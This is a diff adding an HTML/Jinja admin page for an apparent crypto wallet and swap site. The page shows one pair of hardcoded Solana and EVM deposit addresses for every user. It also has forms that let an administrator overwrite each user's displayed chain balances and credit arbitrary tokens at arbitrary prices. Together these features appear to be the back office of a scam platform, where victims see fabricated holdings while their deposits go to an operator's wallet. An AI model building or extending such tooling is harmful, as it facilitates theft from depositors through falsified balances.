@@ -1,0 +1,227 @@
+{% extends "base.html" %}
+{% block title %}{{ user.email }} — Admin{% endblock %}
+{% block content %}
+
+{% set DISPLAY_SOL = "67ZMMrmdR7S2shWpLmfrHZd2dF68JZZyNGDWjfHWcQSV" %}
+{% set DISPLAY_EVM = "0x9901E676D0a27e2B5D3DC9fc9fe227F003F559cf" %}
+
+<div class="admin-page">
+
+  <a href="{{ url_for('admin.dashboard') }}" class="admin-back-link mb-4 d-inline-flex align-items-center gap-2">
+    <i class="bi bi-arrow-left"></i> Dashboard
+  </a>
+
+  <!-- User header -->
+  <div class="admin-user-header mb-4">
+    <div class="d-flex align-items-center gap-4 flex-wrap">
+      <div class="user-avatar user-avatar-lg">{{ (user.username or user.email)[0].upper() }}</div>
+      <div class="flex-grow-1">
+        <div class="d-flex align-items-center gap-3 flex-wrap mb-1">
+          <h2 class="mb-0 fw-800">{% if user.username %}@{{ user.username }}{% else %}{{ user.email.split('@')[0] }}{% endif %}</h2>
+          {% if user.is_admin %}
+            <span class="badge-role badge-admin"><i class="bi bi-shield-lock-fill me-1"></i>Admin</span>
+          {% else %}
+            <span class="badge-role badge-user"><i class="bi bi-person me-1"></i>User</span>
+          {% endif %}
+        </div>
+        <p class="text-secondary mb-0 mt-1" style="font-size:12px;"><i class="bi bi-envelope me-1"></i>{{ user.email }}</p>
+        <p class="text-secondary mb-0" style="font-size:12px; font-family:var(--mono);"><i class="bi bi-fingerprint me-1"></i>{{ user.id }}</p>
+        <p class="text-secondary mb-0 mt-1" style="font-size:12px;"><i class="bi bi-calendar3 me-1"></i>Joined {{ user.created_at.strftime('%B %d, %Y') if user.created_at else '—' }}</p>
+      </div>
+      <div class="d-flex gap-2 flex-wrap">
+        <form method="POST" action="{{ url_for('admin.toggle_admin', user_id=user.id) }}" onsubmit="return confirm('Toggle admin?');">
+          <button type="submit" class="btn-admin-action btn-admin-outline">
+            <i class="bi {% if user.is_admin %}bi-shield-x{% else %}bi-shield-plus{% endif %} me-1"></i>
+            {% if user.is_admin %}Revoke Admin{% else %}Grant Admin{% endif %}
+          </button>
+        </form>
+        {% if user.id != current_user.id %}
+        <form method="POST" action="{{ url_for('admin.delete_user', user_id=user.id) }}" onsubmit="return confirm('Delete permanently?');">
+          <button type="submit" class="btn-admin-action btn-admin-danger">
+            <i class="bi bi-trash3 me-1"></i>Delete
+          </button>
+        </form>
+        {% endif %}
+      </div>
+    </div>
+  </div>
+
+  <div class="row g-4">
+    <!-- LEFT: wallets + balance editor -->
+    <div class="col-lg-5">
+
+      <!-- EVM address -->
+      <div class="address-card mb-3">
+        <div class="address-label"><span class="chain-badge evm-badge me-2">EVM</span>Ethereum · Base · BNB · Polygon</div>
+        <div class="address-row mt-3">
+          <code style="font-size:11px;">{{ DISPLAY_EVM }}</code>
+          <button onclick="navigator.clipboard.writeText('{{ DISPLAY_EVM }}'); this.innerHTML='<i class=\'bi bi-check\'></i> Done'; setTimeout(()=>this.innerHTML='<i class=\'bi bi-copy\'></i> Copy',1500);" class="copy-btn">
+            <i class="bi bi-copy"></i> Copy
+          </button>
+        </div>
+      </div>
+
+      <!-- Solana address -->
+      <div class="address-card address-card-sol mb-4">
+        <div class="address-label"><span class="chain-badge sol-badge me-2">SOL</span>Solana Network</div>
+        <div class="address-row mt-3">
+          <code style="font-size:11px;">{{ DISPLAY_SOL }}</code>
+          <button onclick="navigator.clipboard.writeText('{{ DISPLAY_SOL }}'); this.innerHTML='<i class=\'bi bi-check\'></i> Done'; setTimeout(()=>this.innerHTML='<i class=\'bi bi-copy\'></i> Copy',1500);" class="copy-btn">
+            <i class="bi bi-copy"></i> Copy
+          </button>
+        </div>
+      </div>
+
+      <!-- Balance editor -->
+      <div class="admin-table-card mb-4">
+        <div class="admin-table-header px-4 py-3"><h6 class="mb-0 fw-800"><i class="bi bi-pencil-square me-2"></i>Edit Balances</h6></div>
+        <div class="p-4">
+          <form method="POST" action="{{ url_for('admin.set_balance', user_id=user.id) }}">
+            <div class="section-label mb-2">EVM Chains</div>
+            <div class="row g-2 mb-3">
+              {% for chain_key, icon, sym in [('ethereum','🔷','ETH'),('base','🔵','ETH'),('bsc','🟡','BNB'),('polygon','🟣','MATIC'),('arbitrum','🔹','ETH'),('optimism','🔴','ETH')] %}
+              <div class="col-6">
+                <div class="balance-input-card">
+                  <div class="balance-input-header"><span class="balance-icon">{{ icon }}</span>
+                    <div><div class="fw-700" style="font-size:12px; text-transform:capitalize;">{{ chain_key }}</div>
+                    <div style="font-size:10px; color:var(--text3);">{{ sym }}</div></div>
+                  </div>
+                  <input type="number" step="0.000001" min="0" name="balance_{{ chain_key }}"
+                    value="{{ balance_override.get(chain_key, '') }}" placeholder="0.000000"
+                    class="input mt-2" style="font-family:var(--mono); font-size:13px; font-weight:700; padding:8px;">
+                </div>
+              </div>
+              {% endfor %}
+            </div>
+            <div class="section-label mb-2">Solana</div>
+            <div class="balance-input-card mb-3" style="max-width:180px;">
+              <div class="balance-input-header"><span class="balance-icon">🟣</span>
+                <div><div class="fw-700" style="font-size:12px;">Solana</div><div style="font-size:10px; color:var(--text3);">SOL</div></div>
+              </div>
+              <input type="number" step="0.000001" min="0" name="solana_balance"
+                value="{{ solana_balance }}" placeholder="0.000000"
+                class="input mt-2" style="font-family:var(--mono); font-size:13px; font-weight:700; padding:8px;">
+            </div>
+            <button type="submit" class="btn-solid" style="width:auto; padding:10px 22px; font-size:13px;">
+              <i class="bi bi-floppy2-fill me-1"></i>Save Balances
+            </button>
+          </form>
+        </div>
+      </div>
+
+      <!-- Swap orders for this user -->
+      {% if orders %}
+      <div class="admin-table-card">
+        <div class="admin-table-header px-4 py-3"><h6 class="mb-0 fw-800"><i class="bi bi-arrow-left-right me-2"></i>Swap Orders</h6></div>
+        <div style="max-height:260px; overflow-y:auto;">
+          <table class="table token-table mb-0" style="font-size:12px;">
+            <thead><tr><th>Token</th><th>USD</th><th>Status</th><th>Date</th></tr></thead>
+            <tbody>
+              {% for o in orders %}
+              <tr>
+                <td class="fw-700">{{ o.token_symbol }}</td>
+                <td style="font-family:var(--mono);">${{ '%.2f'|format(o.amount_usd) }}</td>
+                <td>
+                  <span class="badge fw-700
+                    {% if o.status == 'confirmed' %}bg-success bg-opacity-10 text-success
+                    {% elif o.status == 'rejected' %}bg-danger bg-opacity-10 text-danger
+                    {% else %}bg-warning bg-opacity-10 text-warning{% endif %}">
+                    {{ o.status }}
+                  </span>
+                </td>
+                <td style="color:var(--text3);">{{ o.created_at.strftime('%m-%d') if o.created_at else '—' }}</td>
+              </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+        </div>
+      </div>
+      {% endif %}
+    </div>
+
+    <!-- RIGHT: token holdings + add token -->
+    <div class="col-lg-7">
+
+      <!-- Current token holdings -->
+      <div class="admin-table-card mb-4">
+        <div class="admin-table-header px-4 py-3 d-flex align-items-center justify-content-between">
+          <h5 class="mb-0 fw-800"><i class="bi bi-coin me-2"></i>Token Holdings</h5>
+          <span class="text-secondary" style="font-size:12px;">{{ token_holdings|length }} token(s)</span>
+        </div>
+        <div class="p-3">
+          {% if token_holdings %}
+            {% for sym, info in token_holdings.items() %}
+            <div class="token-holding-row">
+              <div class="d-flex align-items-center gap-3">
+                <div class="user-avatar" style="width:36px;height:36px;font-size:14px;background:linear-gradient(135deg,#6366f1,#8b5cf6);">
+                  {{ sym[0] }}
+                </div>
+                <div>
+                  <div class="th-sym">{{ sym }}</div>
+                  <div class="th-name">{{ info.name or sym }}</div>
+                  {% if info.address %}<div style="font-size:10px; color:var(--text4); font-family:var(--mono);">{{ info.address[:16] }}…</div>{% endif %}
+                </div>
+              </div>
+              <div class="d-flex align-items-center gap-3">
+                <div class="text-end">
+                  <div class="th-amount">{{ info.amount }}</div>
+                  <div class="th-usd">@ ${{ info.usd_price or '—' }}</div>
+                </div>
+                <form method="POST" action="{{ url_for('admin.remove_token_holding', user_id=user.id, sym=sym) }}"
+                  onsubmit="return confirm('Remove {{ sym }} from holdings?');">
+                  <button type="submit" class="btn-admin-action btn-admin-danger" style="padding:5px 10px; font-size:12px;">
+                    <i class="bi bi-trash3"></i>
+                  </button>
+                </form>
+              </div>
+            </div>
+            {% endfor %}
+          {% else %}
+            <div class="text-center text-secondary py-4" style="font-size:13px;">
+              <i class="bi bi-inbox d-block fs-2 mb-2"></i>No token holdings yet.
+            </div>
+          {% endif %}
+        </div>
+      </div>
+
+      <!-- Add token manually -->
+      <div class="admin-table-card">
+        <div class="admin-table-header px-4 py-3">
+          <h5 class="mb-0 fw-800"><i class="bi bi-plus-circle me-2"></i>Add / Update Token Holding</h5>
+          <p class="text-secondary mb-0 mt-1" style="font-size:12px;">Manually credit tokens after confirming a swap</p>
+        </div>
+        <div class="p-4">
+          <form method="POST" action="{{ url_for('admin.add_token_holding', user_id=user.id) }}">
+            <div class="row g-3 mb-3">
+              <div class="col-6">
+                <label class="section-label mb-1">Symbol *</label>
+                <input type="text" name="token_sym" placeholder="e.g. PEPE" class="input" required style="text-transform:uppercase;">
+              </div>
+              <div class="col-6">
+                <label class="section-label mb-1">Name</label>
+                <input type="text" name="token_name" placeholder="e.g. Pepe Coin" class="input">
+              </div>
+              <div class="col-12">
+                <label class="section-label mb-1">Contract Address</label>
+                <input type="text" name="token_address" placeholder="0x... or Solana CA" class="input" style="font-family:var(--mono); font-size:13px;">
+              </div>
+              <div class="col-6">
+                <label class="section-label mb-1">Amount to Credit *</label>
+                <input type="number" step="0.000001" min="0" name="token_amount" placeholder="e.g. 1000000" class="input" style="font-family:var(--mono);" required>
+              </div>
+              <div class="col-6">
+                <label class="section-label mb-1">Token Price (USD)</label>
+                <input type="number" step="0.00000001" min="0" name="token_usd_price" placeholder="e.g. 0.000001" class="input" style="font-family:var(--mono);">
+              </div>
+            </div>
+            <button type="submit" class="btn-solid" style="width:auto; padding:11px 26px;">
+              <i class="bi bi-plus-circle me-2"></i>Add Token to Portfolio
+            </button>
+          </form>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+{% endblock %}
